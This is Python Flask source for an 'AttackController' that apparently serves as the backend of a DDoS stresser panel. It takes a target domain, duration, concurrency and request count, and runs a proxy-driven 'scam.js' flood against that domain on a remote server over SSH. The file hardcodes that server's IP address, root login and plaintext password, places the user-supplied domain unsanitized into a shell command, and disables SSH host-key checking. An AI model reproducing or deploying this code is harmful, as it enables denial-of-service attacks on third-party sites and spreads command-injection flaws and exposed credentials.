from flask import jsonify, request
import subprocess
import paramiko

class AttackController:
    def _executeRemoteCommand(self, hostname, username, password, command):
        try:
            # Initialize SSH client
            ssh = paramiko.SSHClient()
            # Automatically add host keys
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to remote host
            ssh.connect(hostname, username=username, password=password)
            
            # Execute command
            stdin, stdout, stderr = ssh.exec_command(command)
            
            # Get output
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            # Close connection
            ssh.close()
            
            return output, error
        except Exception as e:
            return None, str(e)

    def attack(self):
        data = request.get_json()
        domain = data.get('domain', '')
        time = data.get('time', '60')
        concurrents = data.get('concurrents', '10')
        requests = data.get('requests', '100')

        if not domain:
            return jsonify({
                "status": "error",
                "message": "Domain is required"
            }), 400
        

        command = f"xvfb-run /root/.nvm/versions/node/v20.18.1/bin/node scam.js {domain} {time} {concurrents} {requests} proxy.txt --debug true --auth true"

        # SSH connection details
        hostname = "199.204.99.242"
        username = "root" 
        password = "42f1cb88E05w"
        
        output, error = self._executeRemoteCommand(hostname, username, password, command)
        
        if error:
            return jsonify({
                "status": "error",
                "message": error
            }), 500
            
        return jsonify({
            "status": "success",
            "output": output
        })
        # try:
        #     # Kill previous Xvfb and xvfb-run processes
        #     subprocess.run("pkill -9 xvfb-run; pkill -9 Xvfb", shell=True, capture_output=True, text=True)

        #     # Execute the command
        #     result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=command.durationOfRunning)
        #     output = result.stdout
        #     error = result.stderr
        #     return_code = result.returncode

        #     if return_code != 0:
        #         return jsonify({
        #             "status": "error",
        #             "message": f"Command execution failed with error: {error}"
        #         }), 500

        #     return jsonify({
        #         "status": "success",
        #         "message": f"Command '{command}' executed successfully",
        #         "output": output
        #     }), 200

        # except subprocess.TimeoutExpired:
        #     return jsonify({
        #     "status": "success",
        #     "message": f"Command '{command}' timeout after {command.durationOfRunning} seconds as expected"
        #     }), 200